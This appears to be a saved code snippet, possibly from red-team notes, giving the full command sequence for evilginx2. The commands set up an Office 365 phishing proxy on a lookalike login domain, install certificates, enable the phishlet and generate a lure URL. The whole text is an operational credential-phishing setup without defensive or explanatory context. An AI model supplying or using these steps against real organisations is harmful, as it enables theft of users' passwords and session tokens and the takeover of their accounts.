---
id: 226bffca-16e6-4464-ab00-eaf581ef3788
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:15.089514+00:00'
updated_at: '2023-05-23T21:48:07.784906+00:00'
---

# Code Snippet 226bffca

**Language**: Powershell

```powershell
PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets
: config domain username.corp
: config ip 10.10.10.10
: phishlets hostname o365 login.username.corp
: phishlets get-hosts o365

Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine

# copy certificate and enable the phishing
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key
: phishlets enable o365

# get the phishing URL
: lures create o365
: lures get-url 0
```
